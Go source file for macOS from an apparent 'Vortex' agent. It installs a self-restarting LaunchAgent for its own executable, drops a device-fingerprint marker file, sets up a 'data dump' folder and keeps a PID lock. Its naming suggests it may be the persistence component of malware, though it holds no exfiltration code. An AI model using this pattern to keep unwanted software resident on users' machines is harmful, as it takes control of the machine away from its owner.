//go:build darwin

package install

import (
    "fmt"
    "os"
    "path/filepath"
    "strings"
)

var (
    FingerprintRK = "vortex-fingerprint"
    persistRK     = "com.vortex.agent"
    dataPath      = filepath.Join(os.Getenv("HOME"), "Library", "Application Support", "Vortex")
    persistPath   = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
)

func CheckDeviceFingerprint() bool {
    fpFile := filepath.Join(dataPath, ".fingerprint")
    _, err := os.Stat(fpFile)
    return err == nil
}

func FingerprintDevice() error {
    if err := os.MkdirAll(dataPath, 0755); err != nil {
        return err
    }
    fpFile := filepath.Join(dataPath, ".fingerprint")
    return os.WriteFile(fpFile, []byte("vortex"), 0644)
}

func InstallPersistence() error {
    exePath, err := os.Executable()
    if err != nil {
        exePath = os.Args[0]
    }
    if _, err := os.Stat(persistPath); os.IsNotExist(err) {
        if err = os.MkdirAll(persistPath, 0755); err != nil {
            return err
        }
    }
    plistPath := filepath.Join(persistPath, "com.vortex.agent.plist")
    plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>%s</string>
    <key>ProgramArguments</key><array><string>%s</string></array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>`, persistRK, exePath)
    return os.WriteFile(plistPath, []byte(plist), 0644)
}

func UninstallPersistence() {
    plistPath := filepath.Join(persistPath, "com.vortex.agent.plist")
    os.Remove(plistPath)
}

func DataDumpLocation() string {
    if _, err := os.Stat(dataPath); os.IsNotExist(err) {
        if err = os.MkdirAll(dataPath, 0755); err != nil {
            return "/tmp"
        }
    }
    return dataPath
}

func ProcessLock() bool {
    lockFile := filepath.Join(dataPath, "LOCK")
    pid := fmt.Sprint(os.Getpid())
    if _, err := os.Stat(lockFile); os.IsNotExist(err) {
        os.MkdirAll(dataPath, 0755)
        os.WriteFile(lockFile, []byte(pid), 0644)
        return false
    }
    old, _ := os.ReadFile(lockFile)
    if !strings.Contains(pid, string(old)) {
        ProcessUnlock()
        os.WriteFile(lockFile, []byte(pid), 0644)
        return false
    }
    return true
}

func ProcessUnlock() {
    os.Remove(filepath.Join(dataPath, "LOCK"))
}
